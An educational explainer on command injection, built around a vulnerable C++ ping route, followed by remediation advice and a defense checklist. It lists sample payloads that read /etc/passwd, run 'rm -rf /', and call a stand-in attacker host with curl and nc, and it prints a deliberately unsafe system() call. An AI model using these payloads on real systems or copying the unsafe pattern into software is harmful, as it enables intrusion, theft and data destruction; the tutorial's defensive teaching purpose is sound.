
* An overview of the vulnerability
* A real-world example (your C++ "ping" app)
* How the attack works
* Detailed remediation strategies
* Best practices

---

# 🛡️ Command Injection: Explanation, Example & Remediation

---

## 🔍 What is Command Injection?

**Command Injection** is a critical security vulnerability that allows attackers to execute arbitrary commands on the host operating system via a vulnerable application. This happens when:

* User input is concatenated into a system command (e.g., via `system()`, `popen()`, or `exec()`)
* The input is not properly validated or sanitized

Command injection gives attackers control over the underlying server, potentially leading to:

* Unauthorized data access
* File deletion or modification
* Privilege escalation
* Total system compromise

---

## 💣 Real-World Example: Vulnerable C++ Web App

Imagine a C++ web server with a route that lets users ping a host by calling the Linux `ping` command via `system()`.

### ⚠️ Vulnerable Code

```cpp
std::string cmd = "ping -c 2 " + user_input + " > output.txt";
system(cmd.c_str());
```

If a user submits:

```
127.0.0.1; whoami
```

The actual shell command becomes:

```bash
ping -c 2 127.0.0.1; whoami > output.txt
```

Result: both `ping` and `whoami` are executed — and the attacker sees the result of `whoami`.

---

## ⚔️ Types of Command Injection

| Type                      | Description                                                                         |
| ------------------------- | ----------------------------------------------------------------------------------- |
| **Direct Injection**      | Executes commands immediately from input (as above)                                 |
| **Blind Injection**       | Output is not returned, but effect is observable (e.g., server delay, file changes) |
| **Out-of-Band Injection** | Command causes external interaction (e.g., DNS or HTTP request to attacker server)  |

---

## 🔍 How Attackers Exploit This

1. **Injection markers**:

   * `;`, `&&`, `||`, `|` → chain commands
   * Backticks $`command`$, `$(command)` → execute inline
2. **Common payloads**:

   * `127.0.0.1; cat /etc/passwd`
   * `127.0.0.1 && curl http://attacker.com`
   * `$(rm -rf /)` (if unprotected shell)

---

## 🔐 Remediation Techniques

### ✅ 1. **Avoid `system()` and related functions**

* Do not use `system()`, `popen()`, `exec()`, `shell_exec()` with untrusted input.

### ✅ 2. **Use Safe APIs Instead**

* Use direct APIs for functionality. For example:

  * Use `boost::asio` for networking (ping equivalent)
  * Use C++ libraries instead of shell commands

### ✅ 3. **Input Whitelisting**

* Validate input against a strict pattern

```cpp
bool is_valid_hostname(const std::string& host) {
    for (char c : host) {
        if (!(isalnum(c) || c == '.' || c == '-'))
            return false;
    }
    return true;
}
```

* Accept **only known safe characters** for hostnames

### ✅ 4. **Escape Arguments**

* If `system()` is unavoidable, at least escape input

  * Not foolproof!
  * Tools: `shlex.quote()` (Python), shell-safe wrappers (C++ doesn't have standard)

### ✅ 5. **Use `fork` + `execv()` Instead of `system()`**

* Bypasses the shell entirely — no interpretation of input

```cpp
pid_t pid = fork();
if (pid == 0) {
    execlp("ping", "ping", "-c", "2", user_input.c_str(), NULL);
    exit(1);
}
```

* `exec` accepts argument arrays and does **not** parse a shell command string

### ✅ 6. **Limit Execution Privileges**

* Run the app as a **non-root** user
* Use containers or sandboxes (e.g., Docker, AppArmor)

### ✅ 7. **Log, Monitor, and Alert**

* Log all input and commands
* Alert on suspicious patterns (e.g., `;`, `&&`, long input strings)

---

## 📘 Summary: Command Injection Defense Checklist

| Technique             | Safe? | Notes                            |
| --------------------- | ----- | -------------------------------- |
| Use of `system()`     | ❌     | Highly discouraged               |
| Input validation      | ✅     | First line of defense            |
| Command escaping      | ⚠️    | Fragile, not foolproof           |
| execv/execvp          | ✅     | Preferable, avoids shell parsing |
| Use of safe libraries | ✅✅    | Best practice                    |
| Drop privileges       | ✅     | Contain damage                   |

---

## 🧪 Testing for Command Injection

* Try payloads like `test; ls`, `$(id)`, `| nc attacker.com 4444`
* Use tools: [Burp Suite](https://portswigger.net/burp), [OWASP ZAP](https://owasp.org/www-project-zap/), [Commix](https://github.com/commixproject/commix)

---

## 🧠 Final Thoughts

Command injection vulnerabilities are **easy to miss** and **catastrophic** in impact. Any time your code calls out to the system shell, **stop and reconsider**:

* Do you need to?
* Can you replace it with a safer library?
* Are you validating and sanitizing everything?

Mitigating command injection is about **good design**, not just patching inputs.


